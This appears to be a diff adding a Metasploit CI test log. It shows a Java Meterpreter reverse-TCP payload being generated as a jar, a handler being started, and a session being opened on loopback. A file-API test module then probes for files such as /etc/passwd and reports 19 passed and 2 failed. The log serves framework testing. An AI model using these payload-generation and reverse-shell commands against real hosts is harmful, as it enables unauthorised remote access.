@@ -1,0 +1,66 @@
+use java/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> generate -o /tmp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-3250-aldkm2.jar -f jar AutoVerifySessionTimeout=10 spawn=0 lport=6014 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> [*] Writing 5265 bytes to /tmp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-3250-aldkm2.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 13
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6014 
+[*] Sending stage (58075 bytes) to 127.0.0.1
+[*] Meterpreter session 14 opened (127.0.0.1:6014 -> 127.0.0.1:44918 ) at 2022-02-03 23:02:40 +0000
+use test/file
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> run session=14 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to /tmp
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 14
+[*] Session type is meterpreter and platform is linux
+[+] should test for directory existence
+[*] Creating directory test-dir
+[*] test-dir created
+[*] Creating directory test-dir/directory
+[*] test-dir/directory created
+[+] should create directories
+[+] should list the directory we just made
+[+] should recursively delete the directory we just made
+[*] Creating directory test-dir
+[*] test-dir created
+[+] should delete a symbolic link target
+[*] Creating directory test-dir.1
+[*] test-dir.1 created
+[*] Creating directory test-dir.2
+[*] test-dir.2 created
+[+] should not recurse into symbolic link directories
+[*] Writing 35000 bytes
+[*] Finished in 0.018143568
+[+] should write binary data
+[*] Read 35000 bytes
+[+] should read the binary data we just wrote
+[+] should delete binary files
+[+] should append binary data
+Does this exist? c:\boot.ini==false
+Does this exist? c:\pagefile.sys==false
+Does this exist? /etc/passwd==true
+Does this exist? /etc/master.passwd==false
+Does this exist? %WINDIR%\system32\notepad.exe==false
+Does this exist? %WINDIR%\system32\calc.exe==false
+Does this exist? /home/runner/work/metasploit-framework/metasploit-framework/test/modules/post/test/file.rb==true
+[+] should test for file existence
+[+] should create text files
+[-] Didn't read what we wrote, actual file on target: ||
+[-] FAILED: should read the text we just wrote
+[-] Didn't read what we wrote, actual file on target: 
+[-] FAILED: should append text files
+[+] should delete text files
+[+] should move files
+[+] should expand home
+[+] should not expand non-isolated tilde
+[+] should not expand mid-string tilde
+[+] should not expand env vars with invalid naming
+[+] should expand multiple variables
+[*] Testing complete in 0.918140969
+[-] Passed: 19; Failed: 2
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> 
